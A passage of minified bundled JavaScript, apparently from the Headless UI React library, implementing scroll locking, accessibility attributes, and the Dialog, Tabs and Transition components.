                            for (; s.parentElement && r(s.parentElement);) s = s.parentElement;
                            t.style(s, "overscrollBehavior", "contain")
                        } else t.style(i.target, "touchAction", "none")
                }), t.addEventListener(e, "touchmove", i => {
                    if (i.target instanceof HTMLElement)
                        if (r(i.target)) {
                            let s = i.target;
                            for (; s.parentElement && s.dataset.headlessuiPortal !== "" && !(s.scrollHeight > s.clientHeight || s.scrollWidth > s.clientWidth);) s = s.parentElement;
                            s.dataset.headlessuiPortal === "" && i.preventDefault()
                        } else i.preventDefault()
                }, {
                    passive: !1
                }), t.add(() => {
                    var i;
                    let s = (i = window.scrollY) != null ? i : window.pageYOffset;
                    a !== s && window.scrollTo(0, a), o && o.isConnected && (o.scrollIntoView({
                        block: "nearest"
                    }), o = null)
                })
            })
        }
    } : {}
}

function $1() {
    return {
        before({
            doc: e,
            d: t
        }) {
            t.style(e.documentElement, "overflow", "hidden")
        }
    }
}

function F1(e) {
    let t = {};
    for (let n of e) Object.assign(t, n(t));
    return t
}
let tn = j1(() => new Map, {
    PUSH(e, t) {
        var n;
        let r = (n = this.get(e)) != null ? n : {
            doc: e,
            count: 0,
            d: pn(),
            meta: new Set
        };
        return r.count++, r.meta.add(t), this.set(e, r), this
    },
    POP(e, t) {
        let n = this.get(e);
        return n && (n.count--, n.meta.delete(t)), this
    },
    SCROLL_PREVENT({
        doc: e,
        d: t,
        meta: n
    }) {
        let r = {
                doc: e,
                d: t,
                meta: F1(n)
            },
            l = [L1(), _1(), $1()];
        l.forEach(({
            before: a
        }) => a == null ? void 0 : a(r)), l.forEach(({
            after: a
        }) => a == null ? void 0 : a(r))
    },
    SCROLL_ALLOW({
        d: e
    }) {
        e.dispose()
    },
    TEARDOWN({
        doc: e
    }) {
        this.delete(e)
    }
});
tn.subscribe(() => {
    let e = tn.getSnapshot(),
        t = new Map;
    for (let [n] of e) t.set(n, n.documentElement.style.overflow);
    for (let n of e.values()) {
        let r = t.get(n.doc) === "hidden",
            l = n.count !== 0;
        (l && !r || !l && r) && tn.dispatch(n.count > 0 ? "SCROLL_PREVENT" : "SCROLL_ALLOW", n), n.count === 0 && tn.dispatch("TEARDOWN", n)
    }
});

function O1(e, t, n) {
    let r = P1(tn),
        l = e ? r.get(e) : void 0,
        a = l ? l.count > 0 : !1;
    return ae(() => {
        if (!(!e || !t)) return tn.dispatch("PUSH", e, n), () => tn.dispatch("POP", e, n)
    }, [t, e]), a
}
let Ya = new Map,
    ar = new Map;

function hu(e, t = !0) {
    ae(() => {
        var n;
        if (!t) return;
        let r = typeof e == "function" ? e() : e.current;
        if (!r) return;

        function l() {
            var o;
            if (!r) return;
            let i = (o = ar.get(r)) != null ? o : 1;
            if (i === 1 ? ar.delete(r) : ar.set(r, i - 1), i !== 1) return;
            let s = Ya.get(r);
            s && (s["aria-hidden"] === null ? r.removeAttribute("aria-hidden") : r.setAttribute("aria-hidden", s["aria-hidden"]), r.inert = s.inert, Ya.delete(r))
        }
        let a = (n = ar.get(r)) != null ? n : 0;
        return ar.set(r, a + 1), a !== 0 || (Ya.set(r, {
            "aria-hidden": r.getAttribute("aria-hidden"),
            inert: r.inert
        }), r.setAttribute("aria-hidden", "true"), r.inert = !0), l
    }, [e, t])
}

function R1({
    defaultContainers: e = [],
    portals: t,
    mainTreeNodeRef: n
} = {}) {
    var r;
    let l = g.useRef((r = n == null ? void 0 : n.current) != null ? r : null),
        a = Qr(l),
        o = z(() => {
            var i, s, u;
            let d = [];
            for (let h of e) h !== null && (h instanceof HTMLElement ? d.push(h) : "current" in h && h.current instanceof HTMLElement && d.push(h.current));
            if (t != null && t.current)
                for (let h of t.current) d.push(h);
            for (let h of (i = a == null ? void 0 : a.querySelectorAll("html > *, body > *")) != null ? i : []) h !== document.body && h !== document.head && h instanceof HTMLElement && h.id !== "headlessui-portal-root" && (h.contains(l.current) || h.contains((u = (s = l.current) == null ? void 0 : s.getRootNode()) == null ? void 0 : u.host) || d.some(v => h.contains(v)) || d.push(h));
            return d
        });
    return {
        resolveContainers: o,
        contains: z(i => o().some(s => s.contains(i))),
        mainTreeNodeRef: l,
        MainTreeNode: g.useMemo(() => function() {
            return n != null ? null : F.createElement(Ir, {
                features: Dr.Hidden,
                ref: l
            })
        }, [l, n])
    }
}
let Ji = g.createContext(() => {});
Ji.displayName = "StackContext";
var Go = (e => (e[e.Add = 0] = "Add", e[e.Remove = 1] = "Remove", e))(Go || {});

function M1() {
    return g.useContext(Ji)
}

function z1({
    children: e,
    onUpdate: t,
    type: n,
    element: r,
    enabled: l
}) {
    let a = M1(),
        o = z((...i) => {
            t == null || t(...i), a(...i)
        });
    return ae(() => {
        let i = l === void 0 || l === !0;
        return i && o(0, n, r), () => {
            i && o(1, n, r)
        }
    }, [o, n, r, l]), F.createElement(Ji.Provider, {
        value: o
    }, e)
}
let Bd = g.createContext(null);

function Vd() {
    let e = g.useContext(Bd);
    if (e === null) {
        let t = new Error("You used a <Description /> component, but it is not inside a relevant parent.");
        throw Error.captureStackTrace && Error.captureStackTrace(t, Vd), t
    }
    return e
}

function D1() {
    let [e, t] = g.useState([]);
    return [e.length > 0 ? e.join(" ") : void 0, g.useMemo(() => function(n) {
        let r = z(a => (t(o => [...o, a]), () => t(o => {
                let i = o.slice(),
                    s = i.indexOf(a);
                return s !== -1 && i.splice(s, 1), i
            }))),
            l = g.useMemo(() => ({
                register: r,
                slot: n.slot,
                name: n.name,
                props: n.props
            }), [r, n.slot, n.name, n.props]);
        return F.createElement(Bd.Provider, {
            value: l
        }, n.children)
    }, [t])]
}
let I1 = "p";

function A1(e, t) {
    let n = Qt(),
        {
            id: r = `headlessui-description-${n}`,
            ...l
        } = e,
        a = Vd(),
        o = ge(t);
    ae(() => a.register(r), [r, a.register]);
    let i = {
        ref: o,
        ...a.props,
        id: r
    };
    return fe({
        ourProps: i,
        theirProps: l,
        slot: a.slot || {},
        defaultTag: I1,
        name: a.name || "Description"
    })
}
let W1 = oe(A1),
    U1 = Object.assign(W1, {});
var H1 = (e => (e[e.Open = 0] = "Open", e[e.Closed = 1] = "Closed", e))(H1 || {}),
    B1 = (e => (e[e.SetTitleId = 0] = "SetTitleId", e))(B1 || {});
let V1 = {
        0(e, t) {
            return e.titleId === t.id ? e : { ...e,
                titleId: t.id
            }
        }
    },
    ql = g.createContext(null);
ql.displayName = "DialogContext";

function Kr(e) {
    let t = g.useContext(ql);
    if (t === null) {
        let n = new Error(`<${e} /> is missing a parent <Dialog /> component.`);
        throw Error.captureStackTrace && Error.captureStackTrace(n, Kr), n
    }
    return t
}

function Q1(e, t, n = () => [document.body]) {
    O1(e, t, r => {
        var l;
        return {
            containers: [...(l = r.containers) != null ? l : [], n]
        }
    })
}

function K1(e, t) {
    return Z(t.type, V1, e, t)
}
let Y1 = "div",
    G1 = Hn.RenderStrategy | Hn.Static;

function X1(e, t) {
    let n = Qt(),
        {
            id: r = `headlessui-dialog-${n}`,
            open: l,
            onClose: a,
            initialFocus: o,
            role: i = "dialog",
            __demoMode: s = !1,
            ...u
        } = e,
        [d, h] = g.useState(0),
        v = g.useRef(!1);
    i = function() {
        return i === "dialog" || i === "alertdialog" ? i : (v.current || (v.current = !0, console.warn(`Invalid role [${i}] passed to <Dialog />. Only \`dialog\` and and \`alertdialog\` are supported. Using \`dialog\` instead.`)), "dialog")
    }();
    let y = Zi();
    l === void 0 && y !== null && (l = (y & Le.Open) === Le.Open);
    let w = g.useRef(null),
        x = ge(w, t),
        S = Qr(w),
        f = e.hasOwnProperty("open") || y !== null,
        c = e.hasOwnProperty("onClose");
    if (!f && !c) throw new Error("You have to provide an `open` and an `onClose` prop to the `Dialog` component.");
    if (!f) throw new Error("You provided an `onClose` prop to the `Dialog`, but forgot an `open` prop.");
    if (!c) throw new Error("You provided an `open` prop to the `Dialog`, but forgot an `onClose` prop.");
    if (typeof l != "boolean") throw new Error(`You provided an \`open\` prop to the \`Dialog\`, but the value is not a boolean. Received: ${l}`);
    if (typeof a != "function") throw new Error(`You provided an \`onClose\` prop to the \`Dialog\`, but the value is not a function. Received: ${a}`);
    let m = l ? 0 : 1,
        [k, N] = g.useReducer(K1, {
            titleId: null,
            descriptionId: null,
            panelRef: g.createRef()
        }),
        C = z(() => a(!1)),
        j = z(J => N({
            type: 0,
            id: J
        })),
        E = Yn() ? s ? !1 : m === 0 : !1,
        O = d > 1,
        T = g.useContext(ql) !== null,
        [I, ie] = p1(),
        je = {
            get current() {
                var J;
                return (J = k.panelRef.current) != null ? J : w.current
            }
        },
        {
            resolveContainers: Qe,
            mainTreeNodeRef: Ke,
            MainTreeNode: Kt
        } = R1({
            portals: I,
            defaultContainers: [je]
        }),
        Ye = O ? "parent" : "leaf",
        P = y !== null ? (y & Le.Closing) === Le.Closing : !1,
        L = T || P ? !1 : E,
        $ = g.useCallback(() => {
            var J, ct;
            return (ct = Array.from((J = S == null ? void 0 : S.querySelectorAll("body > *")) != null ? J : []).find(ze => ze.id === "headlessui-portal-root" ? !1 : ze.contains(Ke.current) && ze instanceof HTMLElement)) != null ? ct : null
        }, [Ke]);
    hu($, L);
    let A = O ? !0 : E,
        W = g.useCallback(() => {
            var J, ct;
            return (ct = Array.from((J = S == null ? void 0 : S.querySelectorAll("[data-headlessui-portal]")) != null ? J : []).find(ze => ze.contains(Ke.current) && ze instanceof HTMLElement)) != null ? ct : null
        }, [Ke]);
    hu(W, A), Hm(Qe, C, !(!E || O));
    let ne = !(O || m !== 0);
    zd(S == null ? void 0 : S.defaultView, "keydown", J => {
        ne && (J.defaultPrevented || J.key === De.Escape && (J.preventDefault(), J.stopPropagation(), C()))
    }), Q1(S, !(P || m !== 0 || T), Qe), g.useEffect(() => {
        if (m !== 0 || !w.current) return;
        let J = new ResizeObserver(ct => {
            for (let ze of ct) {
                let Gr = ze.target.getBoundingClientRect();
                Gr.x === 0 && Gr.y === 0 && Gr.width === 0 && Gr.height === 0 && C()
            }
        });
        return J.observe(w.current), () => J.disconnect()
    }, [m, w, C]);
    let [ut, mn] = D1(), Zd = g.useMemo(() => [{
        dialogState: m,
        close: C,
        setTitleId: j
    }, k], [m, k, C, j]), ns = g.useMemo(() => ({
        open: m === 0
    }), [m]), Jd = {
        ref: x,
        id: r,
        role: i,
        "aria-modal": m === 0 ? !0 : void 0,
        "aria-labelledby": k.titleId,
        "aria-describedby": ut
    };
    return F.createElement(z1, {
        type: "Dialog",
        enabled: m === 0,
        element: w,
        onUpdate: z((J, ct) => {
            ct === "Dialog" && Z(J, {
                [Go.Add]: () => h(ze => ze + 1),
                [Go.Remove]: () => h(ze => ze - 1)
            })
        })
    }, F.createElement(Qo, {
        force: !0
    }, F.createElement(Yo, null, F.createElement(ql.Provider, {
        value: Zd
    }, F.createElement(Yo.Group, {
        target: w
    }, F.createElement(Qo, {
        force: !1
    }, F.createElement(mn, {
        slot: ns,
        name: "Dialog.Description"
    }, F.createElement(lr, {
        initialFocus: o,
        containers: Qe,
        features: E ? Z(Ye, {
            parent: lr.features.RestoreFocus,
            leaf: lr.features.All & ~lr.features.FocusLock
        }) : lr.features.None
    }, F.createElement(ie, null, fe({
        ourProps: Jd,
        theirProps: u,
        slot: ns,
        defaultTag: Y1,
        features: G1,
        visible: m === 0,
        name: "Dialog"
    }))))))))), F.createElement(Kt, null))
}
let Z1 = "div";

function J1(e, t) {
    let n = Qt(),
        {
            id: r = `headlessui-dialog-overlay-${n}`,
            ...l
        } = e,
        [{
            dialogState: a,
            close: o
        }] = Kr("Dialog.Overlay"),
        i = ge(t),
        s = z(d => {
            if (d.target === d.currentTarget) {
                if (Zm(d.currentTarget)) return d.preventDefault();
                d.preventDefault(), d.stopPropagation(), o()
            }
        }),
        u = g.useMemo(() => ({
            open: a === 0
        }), [a]);
    return fe({
        ourProps: {
            ref: i,
            id: r,
            "aria-hidden": !0,
            onClick: s
        },
        theirProps: l,
        slot: u,
        defaultTag: Z1,
        name: "Dialog.Overlay"
    })
}
let q1 = "div";

function e0(e, t) {
    let n = Qt(),
        {
            id: r = `headlessui-dialog-backdrop-${n}`,
            ...l
        } = e,
        [{
            dialogState: a
        }, o] = Kr("Dialog.Backdrop"),
        i = ge(t);
    g.useEffect(() => {
        if (o.panelRef.current === null) throw new Error("A <Dialog.Backdrop /> component is being used, but a <Dialog.Panel /> component is missing.")
    }, [o.panelRef]);
    let s = g.useMemo(() => ({
        open: a === 0
    }), [a]);
    return F.createElement(Qo, {
        force: !0
    }, F.createElement(Yo, null, fe({
        ourProps: {
            ref: i,
            id: r,
            "aria-hidden": !0
        },
        theirProps: l,
        slot: s,
        defaultTag: q1,
        name: "Dialog.Backdrop"
    })))
}
let t0 = "div";

function n0(e, t) {
    let n = Qt(),
        {
            id: r = `headlessui-dialog-panel-${n}`,
            ...l
        } = e,
        [{
            dialogState: a
        }, o] = Kr("Dialog.Panel"),
        i = ge(t, o.panelRef),
        s = g.useMemo(() => ({
            open: a === 0
        }), [a]),
        u = z(d => {
            d.stopPropagation()
        });
    return fe({
        ourProps: {
            ref: i,
            id: r,
            onClick: u
        },
        theirProps: l,
        slot: s,
        defaultTag: t0,
        name: "Dialog.Panel"
    })
}
let r0 = "h2";

function l0(e, t) {
    let n = Qt(),
        {
            id: r = `headlessui-dialog-title-${n}`,
            ...l
        } = e,
        [{
            dialogState: a,
            setTitleId: o
        }] = Kr("Dialog.Title"),
        i = ge(t);
    g.useEffect(() => (o(r), () => o(null)), [r, o]);
    let s = g.useMemo(() => ({
        open: a === 0
    }), [a]);
    return fe({
        ourProps: {
            ref: i,
            id: r
        },
        theirProps: l,
        slot: s,
        defaultTag: r0,
        name: "Dialog.Title"
    })
}
let a0 = oe(X1),
    o0 = oe(e0),
    i0 = oe(n0),
    s0 = oe(J1),
    u0 = oe(l0),
    Pe = Object.assign(a0, {
        Backdrop: o0,
        Panel: i0,
        Overlay: s0,
        Title: u0,
        Description: U1
    });

function c0(e = 0) {
    let [t, n] = g.useState(e), r = Gn(), l = g.useCallback(s => {
        r.current && n(u => u | s)
    }, [t, r]), a = g.useCallback(s => !!(t & s), [t]), o = g.useCallback(s => {
        r.current && n(u => u & ~s)
    }, [n, r]), i = g.useCallback(s => {
        r.current && n(u => u ^ s)
    }, [n]);
    return {
        flags: t,
        addFlag: l,
        hasFlag: a,
        removeFlag: o,
        toggleFlag: i
    }
}

function d0({
    onFocus: e
}) {
    let [t, n] = g.useState(!0), r = Gn();
    return t ? F.createElement(Ir, {
        as: "button",
        type: "button",
        features: Dr.Focusable,
        onFocus: l => {
            l.preventDefault();
            let a, o = 50;

            function i() {
                if (o-- <= 0) {
                    a && cancelAnimationFrame(a);
                    return
                }
                if (e()) {
                    if (cancelAnimationFrame(a), !r.current) return;
                    n(!1);
                    return
                }
                a = requestAnimationFrame(i)
            }
            a = requestAnimationFrame(i)
        }
    }) : null
}
const Qd = g.createContext(null);

function f0() {
    return {
        groups: new Map,
        get(e, t) {
            var n;
            let r = this.groups.get(e);
            r || (r = new Map, this.groups.set(e, r));
            let l = (n = r.get(t)) != null ? n : 0;
            r.set(t, l + 1);
            let a = Array.from(r.keys()).indexOf(t);

            function o() {
                let i = r.get(t);
                i > 1 ? r.set(t, i - 1) : r.delete(t)
            }
            return [a, o]
        }
    }
}

function p0({
    children: e
}) {
    let t = g.useRef(f0());
    return g.createElement(Qd.Provider, {
        value: t
    }, e)
}

function Kd(e) {
    let t = g.useContext(Qd);
    if (!t) throw new Error("You must wrap your component in a <StableCollection>");
    let n = m0(),
        [r, l] = t.current.get(e, n);
    return g.useEffect(() => l, []), r
}

function m0() {
    var e, t, n;
    let r = (n = (t = (e = g.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED) == null ? void 0 : e.ReactCurrentOwner) == null ? void 0 : t.current) != null ? n : null;
    if (!r) return Symbol();
    let l = [],
        a = r;
    for (; a;) l.push(a.index), a = a.return;
    return "$." + l.join(".")
}
var h0 = (e => (e[e.Forwards = 0] = "Forwards", e[e.Backwards = 1] = "Backwards", e))(h0 || {}),
    v0 = (e => (e[e.Less = -1] = "Less", e[e.Equal = 0] = "Equal", e[e.Greater = 1] = "Greater", e))(v0 || {}),
    g0 = (e => (e[e.SetSelectedIndex = 0] = "SetSelectedIndex", e[e.RegisterTab = 1] = "RegisterTab", e[e.UnregisterTab = 2] = "UnregisterTab", e[e.RegisterPanel = 3] = "RegisterPanel", e[e.UnregisterPanel = 4] = "UnregisterPanel", e))(g0 || {});
let y0 = {
        0(e, t) {
            var n;
            let r = jn(e.tabs, d => d.current),
                l = jn(e.panels, d => d.current),
                a = r.filter(d => {
                    var h;
                    return !((h = d.current) != null && h.hasAttribute("disabled"))
                }),
                o = { ...e,
                    tabs: r,
                    panels: l
                };
            if (t.index < 0 || t.index > r.length - 1) {
                let d = Z(Math.sign(t.index - e.selectedIndex), {
                    [-1]: () => 1,
                    0: () => Z(Math.sign(t.index), {
                        [-1]: () => 0,
                        0: () => 0,
                        1: () => 1
                    }),
                    1: () => 0
                });
                if (a.length === 0) return o;
                let h = Z(d, {
                    0: () => r.indexOf(a[0]),
                    1: () => r.indexOf(a[a.length - 1])
                });
                return { ...o,
                    selectedIndex: h === -1 ? e.selectedIndex : h
                }
            }
            let i = r.slice(0, t.index),
                s = [...r.slice(t.index), ...i].find(d => a.includes(d));
            if (!s) return o;
            let u = (n = r.indexOf(s)) != null ? n : e.selectedIndex;
            return u === -1 && (u = e.selectedIndex), { ...o,
                selectedIndex: u
            }
        },
        1(e, t) {
            var n;
            if (e.tabs.includes(t.tab)) return e;
            let r = e.tabs[e.selectedIndex],
                l = jn([...e.tabs, t.tab], o => o.current),
                a = (n = l.indexOf(r)) != null ? n : e.selectedIndex;
            return a === -1 && (a = e.selectedIndex), { ...e,
                tabs: l,
                selectedIndex: a
            }
        },
        2(e, t) {
            return { ...e,
                tabs: e.tabs.filter(n => n !== t.tab)
            }
        },
        3(e, t) {
            return e.panels.includes(t.panel) ? e : { ...e,
                panels: jn([...e.panels, t.panel], n => n.current)
            }
        },
        4(e, t) {
            return { ...e,
                panels: e.panels.filter(n => n !== t.panel)
            }
        }
    },
    qi = g.createContext(null);
qi.displayName = "TabsDataContext";

function Bn(e) {
    let t = g.useContext(qi);
    if (t === null) {
        let n = new Error(`<${e} /> is missing a parent <Tab.Group /> component.`);
        throw Error.captureStackTrace && Error.captureStackTrace(n, Bn), n
    }
    return t
}
let es = g.createContext(null);
es.displayName = "TabsActionsContext";

function ts(e) {
    let t = g.useContext(es);
    if (t === null) {
        let n = new Error(`<${e} /> is missing a parent <Tab.Group /> component.`);
        throw Error.captureStackTrace && Error.captureStackTrace(n, ts), n
    }
    return t
}

function w0(e, t) {
    return Z(t.type, y0, e, t)
}
let x0 = g.Fragment;

function k0(e, t) {
    let {
        defaultIndex: n = 0,
        vertical: r = !1,
        manual: l = !1,
        onChange: a,
        selectedIndex: o = null,
        ...i
    } = e;
    const s = r ? "vertical" : "horizontal",
        u = l ? "manual" : "auto";
    let d = o !== null,
        h = ge(t),
        [v, y] = g.useReducer(w0, {
            selectedIndex: o ?? n,
            tabs: [],
            panels: []
        }),
        w = g.useMemo(() => ({
            selectedIndex: v.selectedIndex
        }), [v.selectedIndex]),
        x = He(a || (() => {})),
        S = He(v.tabs),
        f = g.useMemo(() => ({
            orientation: s,
            activation: u,
            ...v
        }), [s, u, v]),
        c = z(E => (y({
            type: 1,
            tab: E
        }), () => y({
            type: 2,
            tab: E
        }))),
        m = z(E => (y({
            type: 3,
            panel: E
        }), () => y({
            type: 4,
            panel: E
        }))),
        k = z(E => {
            N.current !== E && x.current(E), d || y({
                type: 0,
                index: E
            })
        }),
        N = He(d ? e.selectedIndex : v.selectedIndex),
        C = g.useMemo(() => ({
            registerTab: c,
            registerPanel: m,
            change: k
        }), []);
    ae(() => {
        y({
            type: 0,
            index: o ?? n
        })
    }, [o]), ae(() => {
        if (N.current === void 0 || v.tabs.length <= 0) return;
        let E = jn(v.tabs, O => O.current);
        E.some((O, T) => v.tabs[T] !== O) && k(E.indexOf(v.tabs[N.current]))
    });
    let j = {
        ref: h
    };
    return F.createElement(p0, null, F.createElement(es.Provider, {
        value: C
    }, F.createElement(qi.Provider, {
        value: f
    }, f.tabs.length <= 0 && F.createElement(d0, {
        onFocus: () => {
            var E, O;
            for (let T of S.current)
                if (((E = T.current) == null ? void 0 : E.tabIndex) === 0) return (O = T.current) == null || O.focus(), !0;
            return !1
        }
    }), fe({
        ourProps: j,
        theirProps: i,
        slot: w,
        defaultTag: x0,
        name: "Tabs"
    }))))
}
let b0 = "div";

function S0(e, t) {
    let {
        orientation: n,
        selectedIndex: r
    } = Bn("Tab.List"), l = ge(t);
    return fe({
        ourProps: {
            ref: l,
            role: "tablist",
            "aria-orientation": n
        },
        theirProps: e,
        slot: {
            selectedIndex: r
        },
        defaultTag: b0,
        name: "Tabs.List"
    })
}
let E0 = "button";

function N0(e, t) {
    var n, r;
    let l = Qt(),
        {
            id: a = `headlessui-tabs-tab-${l}`,
            ...o
        } = e,
        {
            orientation: i,
            activation: s,
            selectedIndex: u,
            tabs: d,
            panels: h
        } = Bn("Tab"),
        v = ts("Tab"),
        y = Bn("Tab"),
        w = g.useRef(null),
        x = ge(w, t);
    ae(() => v.registerTab(w), [v, w]);
    let S = Kd("tabs"),
        f = d.indexOf(w);
    f === -1 && (f = S);
    let c = f === u,
        m = z(T => {
            var I;
            let ie = T();
            if (ie === Pn.Success && s === "auto") {
                let je = (I = Yi(w)) == null ? void 0 : I.activeElement,
                    Qe = y.tabs.findIndex(Ke => Ke.current === je);
                Qe !== -1 && v.change(Qe)
            }
            return ie
        }),
        k = z(T => {
            let I = d.map(ie => ie.current).filter(Boolean);
            if (T.key === De.Space || T.key === De.Enter) {
                T.preventDefault(), T.stopPropagation(), v.change(f);
                return
            }
            switch (T.key) {
                case De.Home:
                case De.PageUp:
                    return T.preventDefault(), T.stopPropagation(), m(() => at(I, ue.First));
                case De.End:
                case De.PageDown:
                    return T.preventDefault(), T.stopPropagation(), m(() => at(I, ue.Last))
            }
            if (m(() => Z(i, {
                    vertical() {
                        return T.key === De.ArrowUp ? at(I, ue.Previous | ue.WrapAround) : T.key === De.ArrowDown ? at(I, ue.Next | ue.WrapAround) : Pn.Error
                    },
                    horizontal() {
                        return T.key === De.ArrowLeft ? at(I, ue.Previous | ue.WrapAround) : T.key === De.ArrowRight ? at(I, ue.Next | ue.WrapAround) : Pn.Error
                    }
                })) === Pn.Success) return T.preventDefault()
        }),
        N = g.useRef(!1),
        C = z(() => {
            var T;
            N.current || (N.current = !0, (T = w.current) == null || T.focus({
                preventScroll: !0
            }), v.change(f), Vr(() => {
                N.current = !1
            }))
        }),
        j = z(T => {
            T.preventDefault()
        }),
        E = g.useMemo(() => ({
            selected: c
        }), [c]),
        O = {
            ref: x,
            onKeyDown: k,
            onMouseDown: j,
            onClick: C,
            id: a,
            role: "tab",
            type: Bm(e, w),
            "aria-controls": (r = (n = h[f]) == null ? void 0 : n.current) == null ? void 0 : r.id,
            "aria-selected": c,
            tabIndex: c ? 0 : -1
        };
    return fe({
        ourProps: O,
        theirProps: o,
        slot: E,
        defaultTag: E0,
        name: "Tabs.Tab"
    })
}
let C0 = "div";

function T0(e, t) {
    let {
        selectedIndex: n
    } = Bn("Tab.Panels"), r = ge(t), l = g.useMemo(() => ({
        selectedIndex: n
    }), [n]);
    return fe({
        ourProps: {
            ref: r
        },
        theirProps: e,
        slot: l,
        defaultTag: C0,
        name: "Tabs.Panels"
    })
}
let P0 = "div",
    j0 = Hn.RenderStrategy | Hn.Static;

function _0(e, t) {
    var n, r, l, a;
    let o = Qt(),
        {
            id: i = `headlessui-tabs-panel-${o}`,
            tabIndex: s = 0,
            ...u
        } = e,
        {
            selectedIndex: d,
            tabs: h,
            panels: v
        } = Bn("Tab.Panel"),
        y = ts("Tab.Panel"),
        w = g.useRef(null),
        x = ge(w, t);
    ae(() => y.registerPanel(w), [y, w]);
    let S = Kd("panels"),
        f = v.indexOf(w);
    f === -1 && (f = S);
    let c = f === d,
        m = g.useMemo(() => ({
            selected: c
        }), [c]),
        k = {
            ref: x,
            id: i,
            role: "tabpanel",
            "aria-labelledby": (r = (n = h[f]) == null ? void 0 : n.current) == null ? void 0 : r.id,
            tabIndex: c ? s : -1
        };
    return !c && ((l = u.unmount) == null || l) && !((a = u.static) != null && a) ? F.createElement(Ir, {
        as: "span",
        "aria-hidden": "true",
        ...k
    }) : fe({
        ourProps: k,
        theirProps: u,
        slot: m,
        defaultTag: P0,
        features: j0,
        visible: c,
        name: "Tabs.Panel"
    })
}
let L0 = oe(N0),
    $0 = oe(k0),
    F0 = oe(S0),
    O0 = oe(T0),
    R0 = oe(_0),
    Gt = Object.assign(L0, {
        Group: $0,
        List: F0,
        Panels: O0,
        Panel: R0
    });

function M0(e) {
    let t = {
        called: !1
    };
    return (...n) => {
        if (!t.called) return t.called = !0, e(...n)
    }
}

function Ga(e, ...t) {
    e && t.length > 0 && e.classList.add(...t)
}

function Xa(e, ...t) {
    e && t.length > 0 && e.classList.remove(...t)
}

function z0(e, t) {
    let n = pn();
    if (!e) return n.dispose;
    let {
        transitionDuration: r,
        transitionDelay: l
    } = getComputedStyle(e), [a, o] = [r, l].map(s => {
        let [u = 0] = s.split(",").filter(Boolean).map(d => d.includes("ms") ? parseFloat(d) : parseFloat(d) * 1e3).sort((d, h) => h - d);
        return u
    }), i = a + o;
    if (i !== 0) {
        n.group(u => {
            u.setTimeout(() => {
                t(), u.dispose()
            }, i), u.addEventListener(e, "transitionrun", d => {
                d.target === d.currentTarget && u.dispose()
            })
        });
        let s = n.addEventListener(e, "transitionend", u => {
            u.target === u.currentTarget && (t(), s())
        })
    } else t();
    return n.add(() => t()), n.dispose
}

function D0(e, t, n, r) {
    let l = n ? "enter" : "leave",
        a = pn(),
        o = r !== void 0 ? M0(r) : () => {};
    l === "enter" && (e.removeAttribute("hidden"), e.style.display = "");
    let i = Z(l, {
            enter: () => t.enter,
            leave: () => t.leave
        }),
        s = Z(l, {
            enter: () => t.enterTo,
            leave: () => t.leaveTo
        }),
        u = Z(l, {
            enter: () => t.enterFrom,
            leave: () => t.leaveFrom
        });
    return Xa(e, ...t.base, ...t.enter, ...t.enterTo, ...t.enterFrom, ...t.leave, ...t.leaveFrom, ...t.leaveTo, ...t.entered), Ga(e, ...t.base, ...i, ...u), a.nextFrame(() => {
        Xa(e, ...t.base, ...i, ...u), Ga(e, ...t.base, ...i, ...s), z0(e, () => (Xa(e, ...t.base, ...i), Ga(e, ...t.base, ...t.entered), o()))
    }), a.dispose
}

function I0({
    immediate: e,
    container: t,
    direction: n,
    classes: r,
    onStart: l,
    onStop: a
}) {
    let o = Gn(),
        i = Ki(),
        s = He(n);
    ae(() => {
        e && (s.current = "enter")
    }, [e]), ae(() => {
        let u = pn();
        i.add(u.dispose);
        let d = t.current;
        if (d && s.current !== "idle" && o.current) return u.dispose(), l.current(s.current), u.add(D0(d, r.current, s.current === "enter", () => {
            u.dispose(), a.current(s.current)
        })), u.dispose
    }, [n])
}

function Et(e = "") {
    return e.split(/\s+/).filter(t => t.length > 1)
}
let va = g.createContext(null);
va.displayName = "TransitionContext";
var A0 = (e => (e.Visible = "visible", e.Hidden = "hidden", e))(A0 || {});

function W0() {
    let e = g.useContext(va);
    if (e === null) throw new Error("A <Transition.Child /> is used but it is missing a parent <Transition /> or <Transition.Root />.");
    return e
}

function U0() {
    let e = g.useContext(ga);
    if (e === null) throw new Error("A <Transition.Child /> is used but it is missing a parent <Transition /> or <Transition.Root />.");
    return e
}
let ga = g.createContext(null);
ga.displayName = "NestingContext";

function ya(e) {
    return "children" in e ? ya(e.children) : e.current.filter(({
        el: t
    }) => t.current !== null).filter(({
        state: t
    }) => t === "visible").length > 0
}

function Yd(e, t) {
    let n = He(e),
        r = g.useRef([]),
        l = Gn(),
        a = Ki(),
        o = z((y, w = $t.Hidden) => {
            let x = r.current.findIndex(({
                el: S
            }) => S === y);
            x !== -1 && (Z(w, {
                [$t.Unmount]() {
                    r.current.splice(x, 1)
                },
                [$t.Hidden]() {
                    r.current[x].state = "hidden"
                }
            }), a.microTask(() => {
                var S;
                !ya(r) && l.current && ((S = n.current) == null || S.call(n))
            }))
        }),
        i = z(y => {
            let w = r.current.find(({
                el: x
            }) => x === y);
            return w ? w.state !== "visible" && (w.state = "visible") : r.current.push({
                el: y,
                state: "visible"
            }), () => o(y, $t.Unmount)
        }),
        s = g.useRef([]),
        u = g.useRef(Promise.resolve()),
        d = g.useRef({
            enter: [],
            leave: [],
            idle: []
        }),
        h = z((y, w, x) => {
            s.current.splice(0), t && (t.chains.current[w] = t.chains.current[w].filter(([S]) => S !== y)), t == null || t.chains.current[w].push([y, new Promise(S => {
                s.current.push(S)
            })]), t == null || t.chains.current[w].push([y, new Promise(S => {
                Promise.all(d.current[w].map(([f, c]) => c)).then(() => S())
            })]), w === "enter" ? u.current = u.current.then(() => t == null ? void 0 : t.wait.current).then(() => x(w)) : x(w)
        }),
        v = z((y, w, x) => {
            Promise.all(d.current[w].splice(0).map(([S, f]) => f)).then(() => {
                var S;
                (S = s.current.shift()) == null || S()
            }).then(() => x(w))
        });
    return g.useMemo(() => ({
        children: r,
        register: i,
        unregister: o,
        onStart: h,
        onStop: v,
        wait: u,
        chains: d
    }), [i, o, r, h, v, d, u])
}

function H0() {}
let B0 = ["beforeEnter", "afterEnter", "beforeLeave", "afterLeave"];

function vu(e) {
    var t;
    let n = {};
    for (let r of B0) n[r] = (t = e[r]) != null ? t : H0;
    return n
}

function V0(e) {
    let t = g.useRef(vu(e));
    return g.useEffect(() => {
        t.current = vu(e)
    }, [e]), t
}
let Q0 = "div",
    Gd = Hn.RenderStrategy;

function K0(e, t) {
